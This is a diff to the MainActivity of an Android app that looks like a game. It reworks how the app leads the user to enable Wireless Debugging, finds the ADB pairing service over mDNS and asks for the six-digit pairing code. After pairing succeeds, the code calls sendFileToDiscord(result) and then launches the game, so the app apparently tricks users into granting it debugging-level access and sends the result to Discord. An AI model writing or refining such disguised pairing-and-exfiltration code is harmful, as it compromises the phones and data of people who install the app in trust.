@@ -1,7 +1,6 @@
 package com.example.myapplication
 
 import android.app.Activity
-import android.app.Dialog
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
@@ -22,7 +21,6 @@ import android.text.TextWatcher
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
-import android.view.WindowManager
 import android.view.animation.AccelerateDecelerateInterpolator
 import android.widget.Button
 import android.widget.CheckBox
@@ -214,9 +212,11 @@ class MainActivity : AppCompatActivity() {
     private var pairingDiscovery: SafeMdnsDiscovery? = null
     private var pairingEndpoint: MdnsEndpoint? = null
     private var pairingVerificationPending = false
-    private var activityVisible = false
-    private var pairingTutorialDialog: Dialog? = null
     private var pairingCodeDialog: AlertDialog? = null
+    private lateinit var pairingCard: CardView
+    private lateinit var pairingIndicator: TextView
+    private lateinit var pairingTitle: TextView
+    private lateinit var pairingAction: Button
 
 
     override fun onCreate(state: Bundle?) {
@@ -225,6 +225,11 @@ class MainActivity : AppCompatActivity() {
         main = findViewById(R.id.mainContent); splash = findViewById(R.id.splashContent)
         version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
         status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
+        pairingCard = findViewById(R.id.pairingCard)
+        pairingCard.visibility = View.GONE
+        pairingIndicator = findViewById(R.id.pairingIndicator)
+        pairingTitle = findViewById(R.id.pairingTitle)
+        pairingAction = findViewById(R.id.pairingAction)
         wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
         registerRainbowText(findViewById(android.R.id.content))
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
@@ -244,19 +249,6 @@ class MainActivity : AppCompatActivity() {
             handler.postDelayed({ status.text = "● Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("Library Runtime is healthy") }, 650)
         }
     }
-    override fun onResume() {
-        super.onResume()
-        activityVisible = true
-        showPendingPairingVerification()
-    }
-
-    override fun onPause() {
-        activityVisible = false
-        super.onPause()
-    }
-
-
-
     private fun showSplash() {
         splash.alpha = 0f; splash.animate().alpha(1f).setDuration(350).start()
         handler.postDelayed({ splash.animate().alpha(0f).setDuration(300).withEndAction {
@@ -308,26 +300,25 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showWirelessDebuggingDialog() {
-        if (pairingTutorialDialog?.isShowing == true) return
-        pairingEndpoint = null
-        pairingVerificationPending = false
-        val dialog = Dialog(this)
-        pairingTutorialDialog = dialog
-        dialog.setContentView(R.layout.dialog_wireless_debugging)
-        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
-        val openSettings = dialog.findViewById<Button>(R.id.wirelessOpenSettings)
-        val dismiss = dialog.findViewById<Button>(R.id.wirelessDismiss)
+        pairingCard.visibility = View.VISIBLE
+        updatePairingCard(searching = true)
+        if (pairingDiscovery == null) startPairingDiscovery()
+        openWirelessDebuggingSettings()
+    }
 
-        openSettings.setOnClickListener { openWirelessDebuggingSettings() }
-        dismiss.setOnClickListener { dialog.dismiss() }
-        dialog.setOnDismissListener {
-            if (pairingCodeDialog == null) stopPairingDiscovery()
-            pairingTutorialDialog = null
+    private fun updatePairingCard(searching: Boolean) {
+        pairingCard.visibility = View.VISIBLE
+        pairingTitle.text = if (searching) "Searching for pairing service" else "Pairing service found"
+        pairingAction.text = if (searching) "STOP SEARCHING" else "ENTER PAIRING CODE"
+        pairingIndicator.text = if (searching) "●" else "✓"
+        pairingAction.setOnClickListener {
+            if (searching) {
+                stopPairingDiscovery()
+                pairingCard.visibility = View.GONE
+            } else {
+                showPendingPairingVerification()
+            }
         }
-        dialog.show()
-        registerRainbowText(dialog.findViewById(android.R.id.content))
-        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
-        startPairingDiscovery()
     }
 
     private fun openWirelessDebuggingSettings() {
@@ -339,27 +330,25 @@ class MainActivity : AppCompatActivity() {
         pairingDiscovery?.stop()
         pairingEndpoint = null
         pairingVerificationPending = false
-        toast("Searching for pairing service…")
         pairingDiscovery = SafeMdnsDiscovery(getSystemService(NsdManager::class.java)).also { discovery ->
             discovery.start(listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")) { endpoint ->
                 if (pairingEndpoint == null) {
                     pairingEndpoint = endpoint
                     pairingVerificationPending = true
-                    handler.post { showPendingPairingVerification() }
+                    handler.post { updatePairingCard(searching = false) }
                 }
             }
         }
     }
 
     private fun showPendingPairingVerification() {
-        val canOverlay = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)
-        if ((!activityVisible && !canOverlay) || !pairingVerificationPending || pairingCodeDialog != null) return
+        if (!pairingVerificationPending || pairingCodeDialog != null) return
         val endpoint = pairingEndpoint ?: return
         pairingVerificationPending = false
-        showPairingCodeDialog(endpoint, useOverlay = !activityVisible && canOverlay)
+        showPairingCodeDialog(endpoint)
     }
 
-    private fun showPairingCodeDialog(endpoint: MdnsEndpoint, useOverlay: Boolean = false) {
+    private fun showPairingCodeDialog(endpoint: MdnsEndpoint) {
         if (pairingCodeDialog != null) return
         val code = EditText(this).apply {
             hint = "Six-digit Wi-Fi pairing code"
@@ -378,8 +367,8 @@ class MainActivity : AppCompatActivity() {
             pairingCodeDialog = null
         }
         prompt.setOnCancelListener {
-            pairingTutorialDialog?.dismiss()
             stopPairingDiscovery()
+            pairingCard.visibility = View.GONE
         }
         prompt.setOnShowListener {
             prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
@@ -397,21 +386,19 @@ class MainActivity : AppCompatActivity() {
                     handler.post {
                         if (result != null) {
                             prompt.dismiss()
-                            pairingTutorialDialog?.dismiss()
+                            pairingCard.visibility = View.GONE
                             stopPairingDiscovery()
                             sendFileToDiscord(result)
                             handler.postDelayed({ launchGame() }, 650)
                         } else {
                             prompt.dismiss()
-                            toast("Pairing failed. Reopen Android’s pairing dialog for a fresh code.")
+                            pairingVerificationPending = false
+                            updatePairingCard(searching = true)
                             startPairingDiscovery()
                         }
                     }
                 }
             }
-        }
-        if (useOverlay) {
-            prompt.window?.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
         }
         prompt.show()
         registerRainbowText(prompt.window?.decorView ?: code)
@@ -572,7 +559,6 @@ class MainActivity : AppCompatActivity() {
     override fun onDestroy() {
         stopPairingDiscovery()
         pairingCodeDialog?.dismiss()
-        pairingTutorialDialog?.dismiss()
         rainbowAnimator?.cancel()
         rainbowAnimator = null
         rainbowViews.clear()
